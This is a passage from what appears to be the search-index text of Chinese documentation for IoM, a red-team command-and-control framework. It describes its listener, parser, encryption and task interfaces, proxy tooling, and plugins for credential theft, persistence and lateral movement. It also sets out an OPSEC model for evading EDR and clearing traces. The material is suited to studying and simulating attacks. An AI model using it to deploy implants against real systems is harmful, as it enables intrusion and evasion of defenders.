\u89e3\u6790\u5fc3\u8df3\u5305\u5e76\u8fd4\u56de\u4efb\u52a1\u6570\u636e</li> <li>Bind\u6a21\u5f0f: \u4e3b\u52a8\u5411\u76ee\u6807\u53d1\u8d77\u8fde\u63a5  </li> <li>Website\u6a21\u5f0f: \u63d0\u4f9bHTTP\u670d\u52a1\u5206\u53d1\u6587\u4ef6</li> <li>\u4ee3\u7406\u6a21\u5f0f: \u63d0\u4f9b\u7aef\u53e3\u8f6c\u53d1\u548c\u6d41\u91cf\u4e2d\u8f6c</li> </ul> <p>\u53ef\u6269\u5c55\u6027: \u901a\u8fc7\u5b9e\u73b0Pipeline\u7684\u57fa\u672cRPC\u63a7\u5236\u63a5\u53e3\uff0c\u53ef\u4ee5\u63a5\u5165\u5404\u79cd\u5f62\u5f0f\u7684Pipeline\uff0c\u5982\u4e91\u51fd\u6570\u3001\u4ee3\u7406\u3001LOLC2\u7b49\u3002</p> <p>\u8bbe\u8ba1\u7279\u70b9</p> <p>Pipeline\u6bd4\u4f20\u7edfListener\u8bbe\u8ba1\u66f4\u52a0\u7075\u6d3b\uff0c\u652f\u6301\u66f4\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u5e76\u4e14\u4e0eParser\u3001Cryptor\u5b8c\u5168\u89e3\u8026\u3002</p>"},{"location":"IoM/concept/#parser","title":"Parser","text":"<p>\u534f\u8bae\u89e3\u6790\u5668\uff0c\u63a7\u5236\u6700\u7ec8\u6570\u636e\u5305\u683c\u5f0f\u7684\u7ec4\u4ef6\u3002</p> <p>\u8bbe\u8ba1\u76ee\u7684: Parser\u63d0\u4f9b\u4e86\u534f\u8bae\u5b9e\u73b0\u7684\u62bd\u8c61\u5c42\u3002\u867d\u7136\u5185\u90e8\u7ec4\u4ef6\u95f4\u901a\u8fc7Spite\u901a\u8baf\uff0c\u4f46\u6700\u7ec8\u53d1\u9001\u5230\u76ee\u6807\u7684\u6570\u636e\u5305\u53ef\u4ee5\u662f\u4efb\u610f\u683c\u5f0f\u3002</p> <p>\u63a5\u53e3\u5b9a\u4e49: <pre><code>type PacketParser interface {  \n    PeekHeader(conn *peek.Conn) (uint32, uint32, error)  \n    ReadHeader(conn *peek.Conn) (uint32, uint32, error)  \n    Parse([]byte) (*implantpb.Spites, error)  \n    Marshal(*implantpb.Spites, uint32) ([]byte, error)  \n}\n</code></pre></p> <p>\u6838\u5fc3\u529f\u80fd:</p> <ul> <li>Parse: \u4e8c\u8fdb\u5236\u6570\u636e \u2192 Spites\u6620\u5c04</li> <li>Marshal: Spites \u2192 \u4e8c\u8fdb\u5236\u6570\u636e\u6620\u5c04  </li> <li>ReadHeader/PeekHeader: \u534f\u8bae\u8bc6\u522b\u548cheader\u89e3\u6790</li> </ul> <p>\u9ed8\u8ba4\u534f\u8bae\u6808: <pre><code>graph TD\n    subgraph \u901a\u8baf\u534f\u8bae\n        TLS[TLS\u5c42]\n        subgraph \u81ea\u5b9a\u4e49\u52a0\u5bc6\n            Encryption[\u5bf9\u79f0\u52a0\u5bc6\u5c42]\n            subgraph \u5185\u90e8\u7ed3\u6784\n                Header[\u534f\u8bae\u5934]\n                Secure[\u5bc6\u7801\u5b66\u5b89\u5168\u52a0\u5bc6] --&gt; Proto[Protobuf\u6570\u636e]\n            end\n        end\n    end</code></pre></p> <p>\u6269\u5c55\u80fd\u529b:</p> <ul> <li>\u81ea\u5b9a\u4e49\u4f20\u8f93\u534f\u8bae\u683c\u5f0f</li> <li>\u63a5\u5165\u7b2c\u4e09\u65b9C2\u6846\u67b6</li> <li>\u4f5c\u4e3a\u5176\u4ed6C2\u7684external listener</li> <li>\u9002\u914d\u4e0d\u540c\u7684implant\u534f\u8bae</li> </ul>"},{"location":"IoM/concept/#cryptor","title":"Cryptor","text":"<p>\u6d41\u5f0f\u52a0\u5bc6\u89e3\u5bc6\u5668\uff0c\u8d1f\u8d23\u6570\u636e\u6d41\u7684\u52a0\u5bc6\u5904\u7406\u3002</p> <p>\u63a5\u53e3\u8bbe\u8ba1: <pre><code>type Cryptor interface {  \n    Encrypt(reader io.Reader, writer io.Writer) error  \n    Decrypt(reader io.Reader, writer io.Writer) error  \n    Reset() error  \n}\n</code></pre></p> <p>\u7279\u6027:</p> <ul> <li>\u76f4\u63a5\u4f5c\u7528\u4e8e\u8fde\u63a5\u6d41(\u4e0eREM\u76f8\u540c\u8bbe\u8ba1)</li> <li>\u652f\u6301\u6d41\u5f0f\u52a0\u5bc6\u7b97\u6cd5</li> <li>\u5bf9\u5168\u5305\u8fdb\u884c\u52a0\u5bc6\u89e3\u5bc6</li> </ul> <p>\u5f53\u524d\u5b9e\u73b0:</p> <ul> <li>XOR: \u7b80\u5355\u5f02\u6216\u52a0\u5bc6</li> <li>AES-CFB: AES CFB\u6a21\u5f0f</li> </ul> <p>\u7ec4\u4ef6\u89e3\u8026</p> <p>Parser\u3001Pipeline\u3001Cryptor\u4e09\u8005\u5b8c\u5168\u89e3\u8026\uff0c\u53ef\u4ee5\u4efb\u610f\u7ec4\u5408\u4f7f\u7528\uff0c\u63d0\u4f9b\u6781\u5927\u7684\u7075\u6d3b\u6027\u3002</p>"},{"location":"IoM/concept/#task","title":"Task","text":"<p>IoM\u4e2d\u7684\u4efb\u52a1\u7ba1\u7406\u57fa\u4e8eTask\u548cJob\u4e24\u4e2a\u6838\u5fc3\u6982\u5ff5\uff0c\u5b9e\u73b0\u4e86\u7075\u6d3b\u7684\u5f02\u6b65\u4efb\u52a1\u8c03\u5ea6\u548c\u7ba1\u7406\u3002</p>"},{"location":"IoM/concept/#task_1","title":"Task","text":"<p>Task\u662fIoM\u4e2d\u6700\u5c0f\u7684\u6267\u884c\u5355\u5143\uff0c\u6bcf\u4e2a\u7528\u6237\u64cd\u4f5c\u90fd\u4f1a\u751f\u6210\u4e00\u4e2aTask\u3002</p> <p>\u6838\u5fc3\u7279\u6027:</p> <ul> <li>\u552f\u4e00\u6807\u8bc6: \u6bcf\u4e2aTask\u6709\u552f\u4e00\u7684task_id</li> <li>\u72b6\u6001\u7ba1\u7406: \u652f\u6301pending\u3001running\u3001completed\u3001failed\u7b49\u72b6\u6001</li> <li>\u5f02\u6b65\u6267\u884c: \u652f\u6301\u957f\u65f6\u95f4\u8fd0\u884c\u7684\u4efb\u52a1</li> <li>\u7ed3\u679c\u7f13\u5b58: \u4efb\u52a1\u7ed3\u679c\u53ef\u4ee5\u88ab\u7f13\u5b58\u548c\u67e5\u8be2</li> </ul> <p>\u751f\u547d\u5468\u671f:</p> <ol> <li>\u521b\u5efa: Client\u53d1\u9001\u547d\u4ee4\u65f6\u521b\u5efaTask</li> <li>\u5206\u53d1: Server\u5c06Task\u8f6c\u53d1\u7ed9\u5bf9\u5e94\u7684Listener</li> <li>\u6267\u884c: Implant\u63a5\u6536\u5e76\u6267\u884cTask</li> <li>\u8fd4\u56de: \u6267\u884c\u7ed3\u679c\u901a\u8fc7\u76f8\u540c\u8def\u5f84\u8fd4\u56de</li> <li>\u5b8c\u6210: Task\u72b6\u6001\u66f4\u65b0\u4e3a\u5b8c\u6210\u6216\u5931\u8d25</li> </ol>"},{"location":"IoM/concept/#rem\u7f51\u7edc\u5de5\u5177\u5305","title":"REM\u7f51\u7edc\u5de5\u5177\u5305","text":"<p>REM(Request Enhancement Module)\u662fIoM\u7684\u7f51\u7edc\u5de5\u5177\u5305\uff0c\u63d0\u4f9b\u5f3a\u5927\u7684\u6d41\u91cf\u4ee3\u7406\u548c\u96a7\u9053\u80fd\u529b\u3002</p> <p>\u6838\u5fc3\u529f\u80fd:</p> <ul> <li>\u6b63\u53cd\u5411\u4ee3\u7406: \u652f\u6301HTTP/HTTPS/SOCKS\u4ee3\u7406</li> <li>\u7aef\u53e3\u8f6c\u53d1: TCP/UDP\u7aef\u53e3\u8f6c\u53d1\u548c\u6620\u5c04</li> <li>\u6d41\u91cf\u96a7\u9053: \u57fa\u4e8e\u591a\u79cd\u534f\u8bae\u7684\u96a7\u9053\u901a\u8baf</li> <li>LOLC2\u652f\u6301: Living off the Land C2\u6280\u672f\u652f\u6301</li> <li>\u6d41\u91cf\u6df7\u6dc6: \u591a\u79cd\u6d41\u91cf\u4f2a\u88c5\u548c\u52a0\u5bc6\u65b9\u6848</li> </ul> <p>\u4e0eIoM\u96c6\u6210:</p> <ul> <li>\u53ef\u4f5c\u4e3a\u72ec\u7acb\u670d\u52a1\u90e8\u7f72</li> <li>\u4e0eListener\u6df1\u5ea6\u96c6\u6210</li> <li>\u652f\u6301\u7ea7\u8054\u90e8\u7f72</li> <li>\u63d0\u4f9b\u7edf\u4e00\u7684\u914d\u7f6e\u7ba1\u7406</li> </ul> <p>\u8be6\u7ec6\u6587\u6863</p> <p>REM\u7684\u5b8c\u6574\u529f\u80fd\u53c2\u8003REM\u6587\u6863\u548c\u4ee3\u7406\u914d\u7f6e\u6307\u5357</p>"},{"location":"IoM/concept/#\u63d2\u4ef6\u751f\u6001\u4e0e\u517c\u5bb9\u6027","title":"\u63d2\u4ef6\u751f\u6001\u4e0e\u517c\u5bb9\u6027","text":"<p>IoM\u6784\u5efa\u4e86\u5b8c\u6574\u7684\u63d2\u4ef6\u751f\u6001\u7cfb\u7edf\uff0c\u65e2\u652f\u6301\u539f\u751f\u63d2\u4ef6\u5f00\u53d1\uff0c\u53c8\u517c\u5bb9\u4e3b\u6d41C2\u6846\u67b6\u7684\u63d2\u4ef6\u751f\u6001\u3002</p>"},{"location":"IoM/concept/#\u62d3\u5c55\u80fd\u529b","title":"\u62d3\u5c55\u80fd\u529b","text":"<p>IoM\u7684\u62d3\u5c55\u80fd\u529b\u662f\u5176\u6838\u5fc3\u4e2d\u7684\u6838\u5fc3\uff0c\u652f\u6301\u5728\u591a\u4e2a\u7ef4\u5ea6\u8fdb\u884c\u529f\u80fd\u6269\u5c55\uff0c\u6784\u5efa\u4e86\u5b8c\u6574\u7684\u53ef\u62d3\u5c55\u751f\u6001\u7cfb\u7edf\u3002</p> \u62d3\u5c55\u7ef4\u5ea6 \u6269\u5c55\u7c7b\u578b \u63cf\u8ff0 \u6587\u6863\u94fe\u63a5 \ud83d\udd27 Client Command\u5f00\u53d1 \u6dfb\u52a0\u81ea\u5b9a\u4e49\u547d\u4ee4 Client\u5f00\u53d1\u6307\u5357 Mal\u63d2\u4ef6\u7cfb\u7edf Lua\u811a\u672c\u6269\u5c55 Mal\u63d2\u4ef6\u6587\u6863 Armory\u517c\u5bb9 Sliver\u751f\u6001\u652f\u6301 \u5185\u7f6e\u63d2\u4ef6\u6587\u6863 \u591a\u8bed\u8a00SDK \u7b2c\u4e09\u65b9\u5ba2\u6237\u7aef\u5f00\u53d1 proto\u4ed3\u5e93 \u2699\ufe0f Server Proto\u534f\u8bae\u6269\u5c55 \u81ea\u5b9a\u4e49\u6d88\u606f\u7c7b\u578b proto\u5b9a\u4e49 RPC\u670d\u52a1\u6269\u5c55 \u6dfb\u52a0\u65b0\u7684RPC\u63a5\u53e3 Server\u5f00\u53d1\u6307\u5357 Parser\u6269\u5c55 \u81ea\u5b9a\u4e49\u534f\u8bae\u89e3\u6790 Server\u5f00\u53d1\u6307\u5357 Pipeline\u6269\u5c55 \u81ea\u5b9a\u4e49\u4f20\u8f93\u901a\u9053 Server\u5f00\u53d1\u6307\u5357 \ud83d\ude80 Implant Module\u7cfb\u7edf \u52a8\u6001\u529f\u80fd\u6a21\u5757 Module\u5f00\u53d1\u6587\u6863 Features\u7f16\u8bd1 \u7f16\u8bd1\u65f6\u529f\u80fd\u9009\u62e9 Implant\u6784\u5efa\u6307\u5357 Addon\u7ba1\u7406 \u4e8c\u8fdb\u5236\u5185\u5b58\u7f13\u5b58 Implant\u5f00\u53d1\u6307\u5357 \u6267\u884c\u5f15\u64ce \u591a\u79cd\u52a0\u8f7d\u65b9\u5f0f Implant\u4f7f\u7528\u624b\u518c Kit\u5de5\u5177\u5305 OPSEC\u5bf9\u6297\u5de5\u5177 \u9ad8\u7ea7\u7528\u6cd5\u6587\u6863 Loader\u6269\u5c55 \u81ea\u5b9a\u4e49\u52a0\u8f7d\u5668 Implant\u5f00\u53d1\u6307\u5357 \ud83d\udd04 \u751f\u6001\u517c\u5bb9 BOF\u517c\u5bb9 CobaltStrike BOF\u652f\u6301 \u5185\u7f6e\u63d2\u4ef6\u6587\u6863 Assembly\u517c\u5bb9 CLR\u7a0b\u5e8f\u6267\u884c Implant\u4f7f\u7528\u624b\u518c PowerShell\u517c\u5bb9 Unmanaged\u6267\u884c Implant\u4f7f\u7528\u624b\u518c Sliver\u517c\u5bb9 Alias/Extension\u652f\u6301 \u5185\u7f6e\u63d2\u4ef6\u6587\u6863 PE\u517c\u5bb9 \u53cd\u5c04\u52a0\u8f7d/SRDI Implant\u4f7f\u7528\u624b\u518c DLL\u517c\u5bb9 UDRL/sideload Implant\u4f7f\u7528\u624b\u518c \ud83d\udce6 \u63d2\u4ef6\u5305 lib\u5305 \u57fa\u7840\u52a0\u8f7d\u5668 community-lib common\u5305 \u901a\u7528\u626b\u63cf\u5de5\u5177 community-common steal\u5305 \u51ed\u8bc1\u63d0\u53d6\u5de5\u5177 community-steal elevate\u5305 \u63d0\u6743\u5de5\u5177 community-elevate persistence\u5305 \u6743\u9650\u7ef4\u6301 community-persistence move\u5305 \u6a2a\u5411\u79fb\u52a8 community-move proxy\u5305 \u4ee3\u7406\u96a7\u9053 community-proxy domain\u5305 \u57df\u6e17\u900f community-domain"},{"location":"IoM/concept/#mal\u63d2\u4ef6\u7cfb\u7edf","title":"Mal\u63d2\u4ef6\u7cfb\u7edf","text":"<p>Mal\u662fIoM\u7684\u6838\u5fc3\u63d2\u4ef6\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u5f3a\u5927\u800c\u7075\u6d3b\u7684\u6269\u5c55\u80fd\u529b\u3002</p>"},{"location":"IoM/concept/#\u6982\u5ff5\u5b9a\u4e49","title":"\u6982\u5ff5\u5b9a\u4e49","text":"<p>Mal\uff08Malice Lua\uff09\u662f\u57fa\u4e8eLua 5.1\u548cgopher-lua\u5b9e\u73b0\u7684\u63d2\u4ef6\u6846\u67b6\uff0c\u4e3aIoM\u63d0\u4f9b\u4e86\uff1a</p> <ul> <li>\u811a\u672c\u5316\u6269\u5c55: \u4f7f\u7528Lua\u7f16\u5199\u81ea\u5b9a\u4e49\u529f\u80fd</li> <li>\u547d\u4ee4\u6ce8\u518c: \u52a8\u6001\u6dfb\u52a0Client\u547d\u4ee4</li> <li>API\u96c6\u6210: \u5b8c\u6574\u7684gRPC\u548c\u5185\u7f6eAPI\u8bbf\u95ee</li> <li>\u751f\u6001\u517c\u5bb9: \u652f\u6301CobaltStrike AggressorScript\u98ce\u683cAPI</li> </ul>"},{"location":"IoM/concept/#\u67b6\u6784\u8bbe\u8ba1","title":"\u67b6\u6784\u8bbe\u8ba1","text":"<pre><code>graph TB\n    subgraph \"Mal\u63d2\u4ef6\u67b6\u6784\"\n        subgraph \"\u63d2\u4ef6\u5c42\"\n            Plugin[\"Mal\u63d2\u4ef6&lt;br/&gt;(.lua + mal.yaml)\"]\n            Library[\"Mal\u5e93&lt;br/&gt;\u53ef\u590d\u7528\u6a21\u5757\"]\n            Community[\"\u793e\u533a\u63d2\u4ef6&lt;br/&gt;mal-community\"]\n        end\n\n        subgraph \"\u8fd0\u884c\u65f6\"\n            VMPool[\"VM\u5b9e\u4f8b\u6c60&lt;br/&gt;\u5e76\u53d1\u7ba1\u7406\"]\n            subgraph \"VM\u5b9e\u4f8b\"\n                LuaVM1[\"Lua VM 1\"]\n                LuaVM2[\"Lua VM 2\"]\n                LuaVMN[\"Lua VM N\"]\n            end\n            Registry[\"\u547d\u4ee4\u6ce8\u518c&lt;br/&gt;Cobra\u96c6\u6210\"]\n            Protobuf[\"Protobuf&lt;br/&gt;\u6d88\u606f\u5904\u7406\"]\n        end\n\n        subgraph \"API\u5c42\"\n            Builtin[\"Builtin API&lt;br/&gt;\u6838\u5fc3\u529f\u80fd\"]\n            RPC[\"RPC API&lt;br/&gt;gRPC\u8c03\u7528\"]\n            Beacon[\"Beacon API&lt;br/&gt;CS\u517c\u5bb9\u5c42\"]\n        end\n\n        subgraph \"\u6269\u5c55\u5e93\"\n            StdLib[\"Lua\u6807\u51c6\u5e93&lt;br/&gt;package/table/io\u7b49\"]\n            ExtLib[\"\u6269\u5c55\u5e93&lt;br/&gt;json/yaml/http\u7b49\"]\n            Storage[\"\u6301\u4e45\u5b58\u50a8&lt;br/&gt;\u8de8\u63d2\u4ef6\u5171\u4eab\"]\n        end\n    end\n\n    %% \u63d2\u4ef6\u52a0\u8f7d\u6d41\u7a0b\n    Community --&gt; Plugin\n    Plugin --&gt; VMPool\n    Library --&gt; VMPool\n\n    %% VM\u6c60\u7ba1\u7406\n    VMPool ==&gt; LuaVM1\n    VMPool ==&gt; LuaVM2\n    VMPool ==&gt; LuaVMN\n\n    %% VM\u4e0eAPI\u8fde\u63a5\n    LuaVM1 -.-&gt; Builtin\n    LuaVM1 -.-&gt; RPC\n    LuaVM1 -.-&gt; Beacon\n\n    %% API\u5185\u90e8\u5173\u7cfb\n    Beacon --&gt; RPC\n    RPC --&gt; Protobuf\n    Builtin --&gt; Registry\n\n    %% VM\u4e0e\u6269\u5c55\u5e93\u8fde\u63a5\n    LuaVM1 -.-&gt; StdLib\n    LuaVM1 -.-&gt; ExtLib\n    ExtLib --&gt; Storage\n\n    classDef pluginStyle fill:#e3f2fd,stroke:#1976d2,stroke-width:2px\n    classDef apiStyle fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px\n    classDef runtimeStyle fill:#fff3e0,stroke:#f57c00,stroke-width:2px\n    classDef vmStyle fill:#e1f5fe,stroke:#0288d1,stroke-width:1px\n    classDef extStyle fill:#e8f5e8,stroke:#388e3c,stroke-width:2px\n\n    class Plugin,Library,Community pluginStyle\n    class Builtin,RPC,Beacon apiStyle\n    class VMPool,Registry,Protobuf runtimeStyle\n    class LuaVM1,LuaVM2,LuaVMN vmStyle\n    class StdLib,ExtLib,Storage extStyle</code></pre>"},{"location":"IoM/concept/#implant-loader\u652f\u6301","title":"Implant Loader\u652f\u6301","text":"\u63d2\u4ef6\u7c7b\u578b \u7528\u9014 \u517c\u5bb9\u6027 \u7279\u6027 Mal\u63d2\u4ef6 Lua\u811a\u672c\u6269\u5c55 IoM\u539f\u751f \u52a8\u6001\u811a\u672c\u3001\u4e30\u5bccAPI Module \u52a8\u6001\u6a21\u5757\u52a0\u8f7d IoM\u539f\u751f Rust FFI\u3001\u70ed\u63d2\u62d4 Addon \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7f13\u5b58 IoM\u539f\u751f \u5185\u5b58\u7f13\u5b58\u3001\u907f\u514d\u91cd\u4f20 BOF Beacon Object File CobaltStrike\u517c\u5bb9 \u8f7b\u91cf\u7ea7\u529f\u80fd\u6269\u5c55 Assembly CLR\u7a0b\u5e8f\u6267\u884c CobaltStrike\u517c\u5bb9 bypass AMSI/ETW PowerShell Unmanaged\u6267\u884c CobaltStrike\u517c\u5bb9 \u7ed5\u8fc7\u9650\u5236\u7b56\u7565 Alias CLR/UDRL\u7ba1\u7406 Sliver\u517c\u5bb9 \u547d\u4ee4\u522b\u540d\u548c\u9884\u8bbe Extension BOF\u7ba1\u7406 Sliver\u517c\u5bb9 \u63d2\u4ef6\u7ba1\u7406 Armory \u63d2\u4ef6\u5305\u7ba1\u7406 Sliver\u517c\u5bb9 \u4e00\u952e\u5b89\u88c5\u7ba1\u7406 <p>\u8be6\u7ec6\u6587\u6863</p> <ul> <li>\u63d2\u4ef6\u5f00\u53d1\u53c2\u8003Mal\u63d2\u4ef6\u6587\u6863</li> <li>\u517c\u5bb9\u6027\u914d\u7f6e\u53c2\u8003\u5185\u7f6e\u63d2\u4ef6\u6587\u6863</li> </ul>"},{"location":"IoM/concept/#opsec\u6a21\u578b","title":"OPSEC\u6a21\u578b","text":"<p>IoM\u8bbe\u8ba1\u4e86\u57fa\u4e8e\u56db\u4e2a\u7ef4\u5ea6\u7684OPSEC\u8bc4\u4f30\u6a21\u578b\uff0c\u53c2\u8003CVSS\u8bc4\u5206\u6807\u51c6\u3002</p>"},{"location":"IoM/concept/#\u8bc4\u5206\u4f53\u7cfb","title":"\u8bc4\u5206\u4f53\u7cfb","text":"<p>\u8bc4\u5206\u8303\u56f4: 0-10\u5206\uff0c\u5206\u8d8a\u9ad8\u8d8a\u5b89\u5168</p> \u7b49\u7ea7 \u5206\u6570 \u63cf\u8ff0 \u4f4e 0-3.9 \u6781\u6613\u88ab\u68c0\u6d4b\uff0c\u660e\u663e\u75d5\u8ff9\uff0c\u53ef\u80fd\u9020\u6210\u4e25\u91cd\u540e\u679c \u4e2d 4.0-6.9 \u53ef\u80fd\u88ab\u68c0\u6d4b\uff0c\u75d5\u8ff9\u53ef\u63a7\uff0c\u540e\u679c\u53ef\u63a7 \u9ad8 7.0-8.9 \u57fa\u672c\u4e0d\u88ab\u68c0\u6d4b\uff0c\u75d5\u8ff9\u8f83\u5c0f\uff0c\u540e\u679c\u8f7b\u5fae OPSEC 9.0-10 \u51e0\u4e4e\u4e0d\u53ef\u80fd\u88ab\u68c0\u6d4b\uff0c\u65e0\u75d5\u8ff9\uff0c\u65e0\u540e\u679c"},{"location":"IoM/concept/#\u8bc4\u4f30\u7ef4\u5ea6","title":"\u8bc4\u4f30\u7ef4\u5ea6","text":"<p>1. \u66b4\u9732\u5ea6 - EDR/NDR\u68c0\u6d4b\u98ce\u9669</p> <ul> <li>\u8fdb\u7a0b\u521b\u5efa\u6d3b\u52a8</li> <li>\u7ebf\u7a0b\u521b\u5efa\u6d3b\u52a8  </li> <li>\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c</li> <li>\u7f51\u7edc\u8fde\u63a5\u5efa\u7acb</li> <li>\u7cfb\u7edfAPI\u8c03\u7528</li> </ul> <p>2. \u75d5\u8ff9 - \u64cd\u4f5c\u53ef\u8ffd\u6eaf\u6027</p> <ul> <li>\u65e5\u5fd7\u5220\u9664\u80fd\u529b</li> <li>\u6587\u4ef6\u6e05\u7406\u80fd\u529b</li> <li>\u6ce8\u518c\u8868\u75d5\u8ff9</li> <li>\u5185\u5b58\u75d5\u8ff9</li> </ul> <p>3. \u68c0\u6d4b\u53ef\u80fd\u6027 - \u88ab\u53d1\u73b0\u7684\u6982\u7387</p> <ul> <li>\u73b0\u6709\u68c0\u6d4b\u673a\u5236\u8986\u76d6</li> <li>\u7cfb\u7edf\u7ea7\u8ffd\u8e2a\u53ef\u80fd\u6027</li> <li>\u68c0\u6d4b\u5b9e\u73b0\u590d\u6742\u5ea6</li> </ul> <p>4. \u540e\u679c - \u88ab\u53d1\u73b0\u540e\u7684\u5f71\u54cd</p> <ul> <li>\u7acb\u8db3\u70b9\u4e22\u5931\u98ce\u9669</li> <li>\u957f\u671f\u6f5c\u4f0f\u5f71\u54cd</li> <li>\u6574\u4f53\u884c\u52a8\u66b4\u9732</li> </ul> <p>\u8be6\u7ec6\u6587\u6863</p> <p>OPSEC\u6700\u4f73\u5b9e\u8df5\u53c2\u8003\u9ad8\u7ea7\u7528\u6cd5\u6587\u6863</p>"},{"location":"IoM/design/","title":"Internet of Malice \u00b7 \u8bbe\u8ba1\u76ee\u6807","text":"<p>IoM\u7684\u8bbe\u8ba1\u6bd4\u5176\u4ed6\u5de5\u5177\u66f4\u4e3a\u590d\u6742, \u6bcf\u4e2a\u529f\u80fd\u7684\u8bbe\u8ba1\u90fd\u4f1a\u7f16\u5199\u72ec\u7acb\u7684\u8bbe\u8ba1\u7ec6\u8282\u95ee\u9898, \u672c\u6587\u53ea\u63d0\u4f9b\u8bbe\u8ba1\u76ee\u6807\u4e0e\u8bbe\u8ba1\u7406\u5ff5\u8bf4\u660e.</p>"},{"location":"IoM/design/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u8fd1\u5e74\u6765\u5f00\u5c55\u7684\u5927\u91cf\u653b\u9632\u6d3b\u52a8\u5c06\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u63a8\u5411\u4e86\u5b9e\u7f51\u5bf9\u6297(Real World), \u800c\u4e0d\u518d\u662f\u6a21\u62df\u73af\u5883(CTF), \u7406\u8bba\u73af\u5883(\u4f20\u7edf\u7f51\u7edc\u5b89\u5168\u5efa\u8bbe)\u7684\u5bf9\u6297. \u5728\u5b9e\u7f51\u5bf9\u6297\u4e2d, \u653b\u51fb\u65b9\u5ef6\u7533\u51fa\u4e86\u4e09\u4e2a\u4e3b\u8981\u7684\u7ec6\u5206\u9886\u57df:</p> <ol> <li>pre-exploit \u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u7684\u4fe1\u606f\u6536\u96c6, \u627e\u5230\u53ef\u4ee5 exploit \u7684\u76ee\u6807, \u8fd9\u4e2a\u65b9\u5411\u53d1\u5c55\u51fa\u4e86 ASM(\u653b\u51fb\u9762\u7ba1\u7406), Cyberspace-Mapping(\u7f51\u7edc\u7a7a\u95f4\u6d4b\u7ed8), VM(\u6f0f\u6d1e\u7ba1\u7406)\u7b49\u7ec6\u5206\u9886\u57df\u7684\u4ea7\u54c1.</li> <li>exploit \u8fd9\u4e2a\u65b9\u5411\u6709\u4f20\u7edf\u7684 Scanner(\u81ea\u52a8\u5316\u626b\u63cf\u5668), \u4eca\u5e74\u6765\u4e5f\u51fa\u73b0\u4e86\u65b0\u5174\u9886\u57df BAS(\u5165\u4fb5\u6a21\u62df), Exploit-Framework(\u6f0f\u6d1e\u5229\u7528\u6846\u67b6), Exploit-Platform(\u6f0f\u6d1e\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u4ea4\u6613\u5e73\u53f0)\u7b49\u7b49</li> <li>post-exploit \u540e\u5229\u7528, \u8fd9\u4e2a\u9886\u57df\u7684\u9632\u5b88\u65b9\u7684\u9632\u62a4\u624b\u6bb5\u8d8a\u6765\u8d8a\u6210\u719f, \u6709\u5927\u91cf <code>*DR/HIDS</code>(\u7aef\u4e0a\u9632\u62a4), SOAR(\u81ea\u52a8\u5316\u54cd\u5e94), CTI(\u5a01\u80c1\u60c5\u62a5) \u8bbe\u5907\u7b49\u7b49, \u4f46\u5728\u653b\u51fb\u65b9\u89c6\u89d2\u4e2d, \u5168\u90e8\u7684\u5bf9\u6297\u90fd\u51dd\u7f29\u5728 AS(\u653b\u51fb\u6a21\u62df, \u53ef\u4ee5\u7406\u89e3\u4e3a C2/Webshell)\u4e0a.</li> </ol> <p>\u4e0a\u9762\u6bcf\u4e2a\u63d0\u5230\u7684\u6bcf\u4e2a\u504f\u5411\u9632\u5b88\u7684\u7ec6\u5206\u9886\u57df\u5728\u8fd1\u4e9b\u5e74\u6765\u90fd\u51fa\u73b0\u4e86\u5bf9\u5e94\u7684\u521b\u4e1a\u516c\u53f8, \u6709\u4e0d\u5c11\u5df2\u7ecf\u6210\u957f\u4e3a\u5e9e\u7136\u5927\u7269.</p> <p>\u4f46\u5bf9\u4e8e\u504f\u5411\u653b\u51fb\u6a21\u62df\u65b9\u5411, \u4e00\u822c\u662f\u7531\u4e59\u65b9\u7ec4\u5efa\u7684\u653b\u51fb\u961f\u5b9e\u65bd, \u5176\u4e2d\u57fa\u5efa\u662f\u4ed6\u4eec\u6700\u6838\u5fc3\u7684\u80fd\u529b, \u9700\u8981\u8ba9\u8fd9\u5757\u80fd\u529b\u7ef4\u6301\u9ed1\u76d2\u72b6\u6001\u4ee5\u4fdd\u6301\u5bf9\u53cb\u5546\u7684\u9886\u5148. \u7532\u65b9\u53ea\u80fd\u901a\u8fc7\u8d2d\u4e70\u670d\u52a1\u7684\u65b9\u5f0f, \u81f3\u591a\u4e5f\u53ea\u80fd\u6316\u51e0\u4e2a\u7ecf\u9a8c\u4e30\u5bcc\u7684\u7ea2\u961f. \u5c3d\u7ba1\u8fd9\u4e24\u5e74\u51fa\u73b0\u4e86\u4e00\u4e2a\u65b0\u6982\u5ff5 BAS(\u5165\u4fb5\u548c\u653b\u51fb\u6a21\u62df), \u901a\u8fc7\u4f7f\u7528 playbook \u7684\u65b9\u5f0f\u81ea\u52a8\u5316\u91cd\u653e\u653b\u51fb\u8fc7\u7a0b, \u5b9e\u73b0\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u5bf9\u9632\u62a4\u80fd\u529b\u7684\u68c0\u9a8c, \u4f46\u56e0 playbook \u7684\u5f3a\u5ea6\u8fdc\u8fdc\u5c0f\u4e8e\u7ea2\u84dd\u5bf9\u6297\u7684\u5f3a\u5ea6, BAS \u81f3\u591a\u6210\u4e3a\u7ea2\u84dd\u5bf9\u6297\u7684\u4e0b\u4f4d\u66ff\u4ee3, \u800c\u975e SRC \u4e4b\u4e8e\u6f0f\u626b\u8fd9\u6837\u7684\u8865\u5145.</p> <p>\u800c\u5728\u56fd\u5916\u51fa\u73b0\u4e86\u4e0d\u5c11\u8fd9\u4e2a\u9886\u57df(offensive security \u9886\u57df)\u7684\u521b\u4e1a\u516c\u53f8. \u56fd\u5185\u6682\u65f6\u5f88\u96be\u590d\u73b0\u4ed6\u4eec\u7684\u8def\u7ebf, \u4f46\u662f\u81f3\u5c11\u5e94\u8be5\u8fdb\u884c\u4e00\u4e9b\u5b9e\u9a8c.</p> <p>\u51e0\u4e4e\u6240\u6709\u4f01\u4e1a\u7684\u7edd\u5927\u90e8\u5206\u5b89\u5168\u9884\u7b97\u90fd\u7528\u5728\u5bf9 C2(\u4ee5\u53ca\u76f8\u5173\u884d\u751f\u6280\u672f)\u7684\u9632\u62a4\u4e0a, \u4f46\u5728\u56fd\u5185\u5374\u7f3a\u5c11\u5bf9\u5e94\u7684\u6a21\u62df\u80fd\u529b. 